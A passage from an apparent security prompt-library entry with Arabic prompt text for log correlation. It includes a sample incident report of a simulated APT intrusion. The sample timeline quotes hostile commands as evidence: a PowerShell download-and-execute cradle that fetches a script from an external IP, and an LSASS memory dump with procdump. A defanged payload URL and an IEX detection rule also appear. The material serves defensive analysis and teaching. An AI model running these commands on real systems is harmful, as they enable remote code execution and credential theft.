   - مراقبة أنماط الوصول للبيانات غير المعتادة

3. كشف حملات الهجوم:
   - تحديد الحوادث ذات الصلة عبر مصادر كشف مختلفة
   - كشف تقنيات الهجوم البطيء والمنخفض
   - تحديد مؤشرات وأنماط التهديدات المستمرة المتقدمة (APT)
   - الارتباط بخلاصات الاستخبارات التهديدية
   - كشف إعادة استخدام البنية التحتية للهجوم

4. التعرف على الأنماط:
   - تحديد تواقيع الهجوم المتكررة
   - كشف الهجمات المنسقة (الموزعة، متعددة المتجهات)
   - التعرف على أنماط الاستطلاع
   - تحديد مجموعات آليات الثبات
   - كشف أنماط تقنيات استخدام أدوات النظام الأصلية

5. دمج الاستخبارات التهديدية:
   - إثراء النتائج بالاستخبارات التهديدية الخارجية
   - مطابقة الأنماط المرصودة مع تكتيكات وتقنيات وإجراءات جهات التهديد المعروفة
   - تحديد حملات الهجوم ومؤشرات الإسناد
   - الارتباط بإطار MITRE ATT&CK
   - الربط بمراحل سلسلة القتل السيبراني

**مصادر السجلات للارتباط:**
- سجلات أحداث ويندوز (الأمان، النظام، التطبيقات)
- سجلات لينكس/يونكس (المصادقة، syslog، auditd)
- سجلات الشبكة (جدار الحماية، IDS/IPS، الوكيل، DNS)
- سجلات التطبيقات (خوادم الويب، قواعد البيانات، البريد الإلكتروني)
- سجلات السحابة (AWS CloudTrail، Azure AD، GCP)
- بيانات كشف نقاط النهاية والاستجابة (EDR)
- سجلات إدارة الهوية والوصول

**منهجية التحليل:**
- تحليل الارتباط الزمني
- رسم خريطة علاقات الكيانات
- كشف الشذوذ الإحصائي
- التعرف على الأنماط بالتعلم الآلي
- صيد التهديدات القائم على الفرضيات

**متطلبات الإدخال:**
- مصادر سجلات متعددة مع طوابع زمنية (تنسيق ISO 8601)
- معرفات الكيانات (المستخدمون، المضيفون، عناوين IP، الجلسات)
- النطاق الزمني للتحليل
- الحوادث المعروفة أو فرضيات الصيد
- فترة المرجعية الأساسية (إن وجدت)

**متطلبات المخرجات:**
- سرد شامل للهجوم
- جدول زمني مرئي للأحداث المرتبطة
- وصف رسم علاقات الكيانات
- درجات الثقة لكل ارتباط
- تقييم إسناد جهة التهديد
- ربط تقنيات MITRE ATT&CK
- ملخص تنفيذي مع تأثير الأعمال
- تحليل تقني مفصل
- توصيات لهندسة الكشف
```

---

## Example Output Preview

```
## Multi-Source Log Correlation Analysis Report

### Analysis Overview
- **Analysis Period:** 2024-01-14 00:00 - 2024-01-15 23:59 UTC
- **Log Sources:** 7 sources (Windows, Linux, Firewall, Proxy, DNS, Azure AD, EDR)
- **Total Events Processed:** 4,892,156
- **Correlation Rules Applied:** 47
- **Alerts Generated:** 23 (12 High, 8 Medium, 3 Low)

---

### Executive Summary

**Attack Campaign Detected:** Spear-phishing led APT intrusion
**Threat Actor Assessment:** APT29 (Cozy Bear) indicators present
**Initial Compromise:** 2024-01-14 09:23:15 UTC
**Dwell Time:** ~38 hours before detection
**Business Impact:** Potential access to financial systems and executive communications

---

### Correlation Timeline

```
2024-01-14 09:23:15 UTC [EMAIL GATEWAY]
└─ Spear-phishing email delivered to CFO (finance-director@company.com)
   └─ Attachment: Q4_Financial_Report.xlsm (malicious macro)
   
2024-01-14 09:25:47 UTC [ENDPOINT - EDR]
└─ Macro execution detected on WS-FINANCE-001
   └─ PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://185.xxx.xxx.xxx/stage1.ps1')
   
2024-01-14 09:26:12 UTC [NETWORK - FIREWALL]
└─ Outbound connection to 185.xxx.xxx.xxx:80
   └─ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)
   └─ Traffic pattern: Beacon every 5 minutes
   
2024-01-14 10:15:33 UTC [WINDOWS - SECURITY]
└─ Credential access via LSASS dump
   └─ Event ID 4688: procdump.exe -ma lsass.exe
   └─ Source: WS-FINANCE-001 (CFO workstation)
   
2024-01-14 11:47:22 UTC [AZURE AD]
└─ Successful authentication to O365 from unusual location
   └─ User: finance-director@company.com
   └─ Source IP: 45.xxx.xxx.xxx (Russia - matches threat intel)
   └─ Session ID: 93f2b8c9d4e5f6g7
   
2024-01-14 12:03:45 UTC [PROXY LOGS]
└─ Data access from compromised O365 session
   └─ Downloaded: Financial_Forecasts_2024.xlsx (2.4 MB)
   └─ Downloaded: Board_Meeting_Notes.docx (156 KB)
   └─ Accessed: SharePoint://Executive/Strategy
   
2024-01-14 14:22:18 UTC [LINUX - AUTH]
└─ Lateral movement to Linux database server
   └─ SSH from 10.0.45.101 (WS-FINANCE-001) to DB-PROD-02
   └─ Using SSH key extracted from CFO workstation
   
2024-01-14 15:30:00 - 17:45:00 UTC [NETWORK - FIREWALL]
└─ Database reconnaissance activity
   └─ Port scans to internal database segment
   └─ Attempted connections to MySQL, PostgreSQL, Oracle ports
   
2024-01-15 02:15:33 UTC [LINUX - SYSLOG]
└─ Privilege escalation on DB-PROD-02
   └─ sudo: db-user : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
   └─ Kernel exploit attempt logged
   
2024-01-15 03:00:00 - 03:47:00 UTC [NETWORK - FIREWALL]
└─ Data exfiltration to C2 server
   └─ Destination: 185.xxx.xxx.xxx:443
   └─ Volume: 4.7 GB encrypted outbound
   └─ Protocol: HTTPS with invalid certificate
   
2024-01-15 08:00:00 UTC [DETECTION]
└─ Correlation rule triggered: Multi-stage APT pattern
   └─ Confidence: 94%
   └─ Sources: EDR + Firewall + Azure AD + Proxy
```

---

### Entity Relationship Map

```
                    ┌─────────────────┐
                    │   CFO Account   │
                    │ finance-director│
                    └────────┬────────┘
                             │ Compromised
                             ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│ Spear-Phishing  │───▶│ WS-FINANCE-001  │───▶│  C2 Server      │
│ Email Campaign  │    │ (Initial Access)│    │ 185.xxx.xxx.xxx │
└─────────────────┘    └────────┬────────┘    └─────────────────┘
                                │
                                │ Lateral Movement
                                ▼
                       ┌─────────────────┐
                       │   DB-PROD-02    │
                       │ (Database Server)│
                       └────────┬────────┘
                                │
                                │ Exfiltration
                                ▼
                       ┌─────────────────┐
                       │ Data Staging    │
                       │ 4.7 GB to C2    │
                       └─────────────────┘
```

---

### MITRE ATT&CK Mapping

| Phase | Technique | ID | Evidence |
|-------|-----------|----|----|
| Initial Access | Spearphishing Attachment | T1566.001 | Malicious Excel macro |
| Execution | PowerShell | T1059.001 | Encoded command execution |
| Persistence | Scheduled Task | T1053.005 | Created on WS-FINANCE-001 |
| Privilege Escalation | Exploit Public-Facing Application | T1190 | Kernel exploit |
| Defense Evasion | Obfuscated Files | T1027 | Encoded PowerShell |
| Credential Access | OS Credential Dumping | T1003 | LSASS dump |
| Discovery | Remote System Discovery | T1018 | Port scanning |
| Lateral Movement | Remote Services | T1021 | SSH lateral movement |
| Collection | Data from Information Repositories | T1213 | SharePoint access |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | HTTPS exfil |
| Command and Control | Web Protocols | T1071.001 | HTTPS beacon |

---

### Threat Actor Attribution

**Assessment:** Medium-High Confidence (78%)

**Indicators Match:**
- C2 infrastructure matches known APT29 campaign
- PowerShell staging script signature matches published IOCs
- TTPs align with historical APT29 operations
- Timing consistent with previous targeting patterns

**Related Campaigns:**
- Operation Cozy Bear (2023)
- NOBELIUM infrastructure reuse

---

### IOCs Extracted

| Type | Value | Context | Threat Intel Match |
|------|-------|---------|-------------------|
| IP | 185.xxx.xxx.xxx | C2 Server | APT29 Infrastructure |
| IP | 45.xxx.xxx.xxx | Proxy for O365 | Tor Exit Node |
| Domain | update-service[.]xyz | DGA Domain | Suspicious |
| Hash | a3f2b8c9... | Macro Document | Malicious |
| Hash | e5f6g7h8... | Stager Script | APT29 Tool |
| URL | hxxp://185.xxx[.]xxx/stage1.ps1 | Payload | Known Bad |
| Email | reports@finance-update[.]com | Phishing Sender | Spoofed |

---

### Recommended Detection Rules

```yaml
# SIEM Correlation Rule
rule: APT_Multi_Stage_Detection
description: Detect multi-stage APT attack patterns
correlation:
  - type: sequence
    within: 24h
    events:
      - source: email_gateway
        filter: attachment_type == "xlsm" AND sender_external
      - source: edr
        filter: process_name == "powershell.exe" AND command_line contains "IEX"
      - source: firewall  
        filter: dest_port == 443 AND bytes_out > 100000000
  actions:
    - alert_severity: critical
    - notify: soc_analysts
    - create_incident: true
```

---

### Recommended Actions

**Immediate (0-4 hours):**
1. Isolate WS-FINANCE-001 and DB-PROD-02
2. Disable CFO account and all active sessions
3. Block identified IOCs at perimeter and DNS
4. Reset credentials for all Finance department
5. Enable enhanced monitoring on executive accounts

**Short-term (4-24 hours):**
1. Conduct full forensic imaging of affected systems
2. Review all Azure AD sign-in logs for period
3. Audit SharePoint access logs for data access
4. Scan all Finance workstations for compromise
5. Engage incident response team for full investigation

**Long-term (1-4 weeks):**
1. Implement MFA for all privileged accounts
2. Deploy advanced email filtering for attachments
3. Enhance PowerShell logging and monitoring
4. Conduct security awareness training for executives
5. Review and update detection rules
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Usage Guidelines

1. **Input Preparation**: Ensure logs are properly formatted with consistent timestamps
2. **Context Provision**: Include relevant environmental context for accurate analysis
3. **Language Selection**: Use English for technical teams, Arabic for regional teams
4. **Model Selection**: GPT-4 recommended for complex correlation analysis
5. **Output Validation**: Always validate AI-generated findings with additional evidence

## Version History
- v1.0 - Initial release with 5 comprehensive prompts
- CyberSec-Prompts-Hub Team
